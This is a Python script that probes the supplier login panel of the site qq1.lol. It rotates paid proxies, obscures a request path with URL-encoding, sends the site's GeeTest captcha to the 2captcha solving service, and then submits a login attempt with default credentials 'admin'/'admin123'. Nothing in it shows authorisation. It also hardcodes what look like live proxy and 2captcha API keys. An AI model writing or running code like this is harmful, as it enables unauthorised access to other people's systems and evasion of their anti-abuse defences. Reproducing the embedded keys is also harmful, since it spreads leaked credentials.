#!/usr/bin/env python3
"""Quick probe: captcha endpoint + one 2captcha solve + one login attempt."""
import json, subprocess, time, urllib.parse
from pathlib import Path

BASE="https://qq1.lol"; QG,PW="C413ED6D","344F550A6F8B"
KEY="685ea1068774ca8f8e9a292a08da66d6"
OUT=Path("/tmp/qq1_sup"); OUT.mkdir(exist_ok=True)
JAR=str(OUT/"probe.jar")

def pick():
    d=json.loads(subprocess.check_output(["curl","-s",f"https://share.proxy.qg.net/query?key={QG}"],text=True,timeout=12))
    for s in [x["server"] for x in d.get("data") or []]:
        cand=f"http://{QG}:{PW}@{s}"
        code=subprocess.run(["curl","-sk","--max-time","10","-x",cand,"-o","/tmp/t.out","-w","%{http_code}",
                             f"{BASE}/%61pi.php?act=siteinfo"],capture_output=True,text=True,timeout=14).stdout.strip()
        if code=="200" and b"sitename" in open("/tmp/t.out","rb").read():
            print("px",s); return cand
    # get new
    time.sleep(2)
    d=json.loads(subprocess.check_output(["curl","-s",f"https://share.proxy.qg.net/get?key={QG}&num=2&area=440000"],text=True,timeout=12))
    print("get", d.get("code"))
    for x in d.get("data") or []:
        cand=f"http://{QG}:{PW}@{x['server']}"
        code=subprocess.run(["curl","-sk","--max-time","10","-x",cand,"-o","/tmp/t.out","-w","%{http_code}",
                             f"{BASE}/%61pi.php?act=siteinfo"],capture_output=True,text=True,timeout=14).stdout.strip()
        if code=="200":
            print("px",x["server"]); return cand
    return None

px=pick()
if not px: raise SystemExit("no px")

def c(url, post=None):
    cmd=["curl","-sk","--max-time","18","-x",px,"-b",JAR,"-c",JAR,"-A","Mozilla/5.0",
         "-H","Referer: https://qq1.lol/sup/login.php","-H","X-Requested-With: XMLHttpRequest",
         "-w","\n__HTTP:%{http_code}"]
    if post is not None:
        body=urllib.parse.urlencode(post) if isinstance(post,dict) else post
        cmd+=["-X","POST","--data-binary",body,"-H","Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    out=subprocess.run(cmd,capture_output=True,text=True,timeout=25).stdout or ""
    b,code=out.rsplit("__HTTP:",1); return b.strip(), code.strip()

# balance
bal=subprocess.check_output(["curl","-s","-X","POST","-H","Content-Type: application/json",
    "-d",json.dumps({"clientKey":KEY}),"https://api.2captcha.com/getBalance"],text=True,timeout=20)
print("balance", bal)

c(BASE+"/sup/login.php")
login_html,_=c(BASE+"/sup/login.php")
print("login_html len", len(login_html))
(OUT/"login.html").write_text(login_html, errors="replace")

for url in [f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}",
            f"{BASE}/sup/ajax.php?act=captcha&t={int(time.time()*1000)}"]:
    b,code=c(url)
    print("CAPTCHA", url, code, b[:300])
    (OUT/"captcha.json").write_text(b)
    if "gt" in b or "challenge" in b or "captcha_id" in b:
        cap=json.loads(b)
        break
else:
    raise SystemExit("no captcha")

print("cap keys", list(cap.keys()))
task={"type":"GeeTestTaskProxyless","websiteURL":BASE+"/sup/login.php",
      "gt":cap.get("gt") or cap.get("captcha_id"),
      "challenge":cap.get("challenge") or ""}
if "captcha_id" in cap and not cap.get("challenge"):
    task["version"]=4
print("task", task)
r=subprocess.check_output(["curl","-s","-X","POST","-H","Content-Type: application/json",
    "-d",json.dumps({"clientKey":KEY,"task":task}),"https://api.2captcha.com/createTask"],text=True,timeout=30)
print("create", r)
data=json.loads(r)
if data.get("errorId"): raise SystemExit(data)
tid=data["taskId"]
sol=None
for i in range(30):
    time.sleep(5)
    r=subprocess.check_output(["curl","-s","-X","POST","-H","Content-Type: application/json",
        "-d",json.dumps({"clientKey":KEY,"taskId":tid}),"https://api.2captcha.com/getTaskResult"],text=True,timeout=25)
    d=json.loads(r)
    print("poll", i, d.get("status"), d.get("errorId"), str(d)[:160])
    if d.get("errorId"): raise SystemExit(d)
    if d.get("status")=="ready":
        sol=d["solution"]; break
if not sol: raise SystemExit("timeout")
print("solution keys", list(sol.keys()))
(OUT/"solution.json").write_text(json.dumps(sol,indent=2))

post={
    "user":"admin","pass":"admin123",
    "geetest_challenge": sol.get("challenge") or cap.get("challenge") or "",
    "geetest_validate": sol.get("validate") or "",
    "geetest_seccode": sol.get("seccode") or ((sol.get("validate") or "")+"|jordan"),
}
b,code=c(BASE+"/sup/ajax.php?act=login", post)
print("LOGIN", code, b)
